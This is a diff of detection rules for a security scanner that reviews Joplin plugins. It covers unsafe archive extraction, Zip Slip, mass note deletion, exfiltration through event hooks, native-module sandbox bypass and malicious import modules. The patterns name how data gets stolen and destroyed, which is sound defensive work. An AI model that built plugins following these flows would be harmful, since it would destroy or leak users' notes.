-**Reviewer Action:** This can lead to arbitrary file overwrites. Verify that the archive source is trusted, and that the extraction logic strictly validates the archive contents before unzipping.
+Unsafe Archive Extraction: An archive downloaded from the network or controlled by user input is being extracted to disk.  
+**Reviewer Action:** Verify the archive source is trusted, the download is integrity-checked (hash/signature), and extraction output is scoped to `joplin.plugins.dataDir()`. Combined with a path traversal bug this enables arbitrary file overwrite.
 
-  ### Severity : warning
+### Severity : warning
 
-  #  Rule 17b : Unsafe Archive Extraction Destination
+# Rule 17b : Unsafe Archive Extraction Destination
 
-  Extracting archives to paths outside the plugin's data directory can overwrite sensitive files.
+Extracting archives to paths outside the plugin's safe data directory.
 
-  ### Flows :
+### Flows :
 
-  1.  joplin.plugins.dataDir()  ->  archiveExtract()  destinationPath argument (allowed flow)
-  2. Final alert fires when NO such flow exists -> destination is unsafe/unrelated to data directory
+1. `archiveExtract(src, dest)` where `dest` is NOT derived from `joplin.plugins.dataDir()` or `joplin.plugins.installationDir()`
+2. `archiveExtract(src, dest)` where `dest` is derived from user input, remote fetch, or `process.env`
+3. `archiveExtract(src, dest)` where `dest` is a hardcoded path outside plugin directories (e.g. `~/.config`, `__dirname`)
 
-  ### Messages :
+### Messages :
 
-  Unsafe Extraction Destination: An archive is being extracted to a path outside of the plugin's isolated data directory. 
-**Reviewer Action:** Extraction paths must be strictly derived from `joplin.plugins.dataDir()`. Reject this if it risks overwriting user configuration files or core Joplin application data.
+Unsafe Extraction Destination: An archive is being extracted to a path that is not safely derived from the plugin's isolated data directory.  
+**Reviewer Action:** Extraction destination must derive from `joplin.plugins.dataDir()`. Paths from user input, remote sources, or hardcoded system locations risk overwriting `database.sqlite`, SSH keys, or shell configs.
 
-  ### Severity : warning
+### Severity : warning
 
-  #  Rule 17c : Archive Entry Traversal
+# Rule 17c : Archive Entry Traversal
 
-  Using unsanitized archive entry names in filesystem paths can lead to path traversal vulnerabilities.
+Using unsanitized archive entry names in filesystem paths (Zip Slip).
 
-  ### Flows :
+### Flows :
 
-  1.  archiveExtract()  call result -> individual  ArchiveEntry  object ->  .name  /  .entryName  read -> filesystem path sink
+1. `archiveExtract()` result -> `ArchiveEntry` -> `.name` / `.entryName` -> filesystem path sink
+2. `archiveExtract()` result -> `ArchiveEntry` -> `.name` / `.entryName` -> `child_process` sink (execute extracted file at traversed path)
 
-  ### Messages :
+### Messages :
 
-  Path Traversal Risk (Zip Slip): Unsanitized file names from inside an extracted archive are flowing directly into file system paths. 
-**Reviewer Action:** Ensure the plugin sanitizes archive entry names (e.g., blocking `../` sequences) before writing them to disk to prevent "Zip Slip" vulnerabilities from overwriting sensitive files outside the target directory.
+Path Traversal Risk (Zip Slip): Unsanitized file names from inside an extracted archive are flowing directly into file system paths or command execution.  
+**Reviewer Action:** Ensure the plugin sanitizes archive entry names (blocking `../` and absolute paths) before writing to disk or executing. Zip Slip can silently overwrite `database.sqlite`, config files, or drop executables outside the target directory.
 
-  ### Severity : warning
+### Severity : warning
 
-#    Rule 17d : Third-Party Archive Extraction
+# Rule 18 : Mass Data Destruction
 
-  Usage of third-party archive extraction libraries, which may lack necessary path validation.
+Iterating through notes/folders to permanently destroy the database.
 
-  ### Flows :
+### Flows :
 
-  1.  import / require  of  extract-zip ,  yauzl ,  adm-zip , or  tar
+1. `joplin.data.delete(["folders", ...])` — unconditional, cascades to all child notes
+2. `joplin.data.delete(...)` inside unbounded `while(true)` / `for(;;)` / `setInterval` / recursive `setTimeout` / `.forEach` or `.map` over a note/folder ID array
+3. `joplin.data.put(...)` inside any loop where payload sets `deleted_time` or `is_conflict`
+4. `joplin.data.put(...)` inside any loop where payload sets `body: ""` (content wipe)
 
-  ### Messages :
+### Messages :
 
-  Third-Party Extractor Warning: The plugin is using an external library (like `extract-zip`, `adm-zip`, or `tar`) to unpack archives. 
-**Reviewer Action:** Third-party extractors often lack native path validation. Manually audit the extraction flow to ensure the developer has implemented robust source validation and directory traversal prevention.
-
-  ### Severity : warning
-
-  #  Rule 18 : Mass Data Destruction
-
-  Iterating through notes/folders to permanently destroy the database.
-
-  ### Flows :
-
-  1.  joplin.data.delete(["folders", ...])  (cascading destruction, flagged unconditionally)
-  2.  joplin.data.delete(...)  inside a synchronous loop OR an unbounded  setInterval  callback
-  3.  joplin.data.put(...)  inside a loop, where payload sets  deleted_time  or  is_conflict
-
-  ### Messages :
-
-  Mass Data Destruction: The plugin is either deleting an entire folder (which cascades to all its notes) or looping to delete/soft-delete many items at once.
+Mass Data Destruction: The plugin is either deleting an entire folder (which cascades to all its notes) or looping to delete/soft-delete many items at once.  
 **Reviewer Action:** This can permanently destroy the user's database. Verify this is a legitimate bulk-management feature explicitly initiated by the user. If a loop is used, ensure it is bounded by finite, safe limits and not attacker-controlled.
 
-  ### Severity : warning
+### Severity : warning
 
-  #  Rule 19 : Keylogging & Silent Surveillance
+# Rule 19 : Keylogging & Silent Surveillance
 
-  Monitoring user notes and exfiltrating data.
+Monitoring user notes and exfiltrating data.
 
-  ### Flows :
+### Flows :
 
-  1.  workspace.onNoteContentChange / onNoteChange / onNoteSelectionChange / onSyncStart / onSyncComplete / onResourceChange / onNoteAlarmTrigger
-  callback parameter -> network exfiltration sink
-  2.  settings.onChange  /  editor.onUpdate  /  filters.on  /  panels.onMessage  callback parameter -> network exfiltration sink
+1.  workspace.onNoteContentChange / onNoteChange / onNoteSelectionChange / onSyncStart / onSyncComplete / onResourceChange / onNoteAlarmTrigger
+    callback parameter -> network exfiltration sink
+2.  settings.onChange / editor.onUpdate / filters.on / panels.onMessage callback parameter -> network exfiltration sink
 
-  ### Messages :
+### Messages :
 
-  Silent Surveillance / Hook Exfiltration: Data captured from a workspace, settings, or sync event hook is being funneled directly to a network endpoint. 
-**Reviewer Action:** This captures live user activity (e.g., settings changes, post-sync harvesting, or editor keystrokes). Ensure the plugin has explicit user consent to transmit telemetry or data state changes, and verify the endpoint is secure.
+Data captured from a workspace, settings, or sync event hook is being sent directly to a network endpoint. This captures live user activity (e.g., settings changes, post-sync harvesting, or editor keystrokes).
 
-  ### Severity : error
+### Severity : error
 
- #   Rule 20 : Native Module Imports
+# Rule 20 : Native Module Imports
 
-  Bypassing  joplin.require  to gain host access.
+Bypassing joplin.require to gain host access.
 
-  ### Flows :
+### Flows :
 
-  1.  require() / import  of  fs ,  net ,  os ,  dgram ,  child_process ,  tls ,  http ,  https ,  sqlite3 , or  better-sqlite3  (with or without "node:"
-  prefix)
+1.  require() / import of fs , net , os , dgram , child_process , tls , http , https , sqlite3 , or better-sqlite3 (with or without "node:"prefix)
 
-  ### Messages :
+### Messages :
 
-  Sandbox Bypass (Native Import): The plugin is directly requiring a core Node.js native module (like `fs`, `net`, or `child_process`) without using `joplin.require`. 
-**Reviewer Action:** Direct native imports evade Joplin's permission and wrapper systems. Instruct the developer to switch to `joplin.require('module-name')` to ensure standard security policies and hooks apply.
+The plugin is directly importing a core Node.js native module (like `fs`, `net`, or `child_process`) without using `joplin.require`.
 
-  ### Severity : error
+### Severity : error
 
-  #  Rule 21 : Malicious Import Module
+# Rule 21 : Malicious Import Module
 
-  Detects if data read from an imported file inside  registerImportModule  flows to a dangerous sink.
+Detects if data read from an imported file inside `registerImportModule` flows to a dangerous sink.
 
-  ### Flows :
+### Flows :
 
-  1.  onExec  callback's context parameter -> network exfiltration sink
-  2.  onExec  callback's context parameter ->  context.sourcePath  ->  readFile / readJSON  -> network or command execution sink
+1. `onExec(context)` callback's context parameter -> network exfiltration sink
+2. `onExec(context)` callback's context parameter -> `context.sourcePath` -> `readFile / readJSON` -> network or command execution sink
+3. `onExec(context)` callback's context parameter -> `context.sourcePath` -> `readFile` -> file system write sink (payload drop outside safe directory)
 
-  ### Messages :
+### Messages :
 
-  Malicious Import Processing: Data read during a custom `registerImportModule` execution is flowing into a dangerous sink (network exfiltration or OS command execution). 
-**Reviewer Action:** Importing a note should only result in note creation. Verify why the plugin needs to execute commands or phone home based on the contents of an imported file. Ensure strict sanitization.
+Data read during a custom `registerImportModule` execution is flowing into a dangerous sink (network request, command execution, or unauthorized file write).
 
-  ### Severity : warning
+### Severity : warning
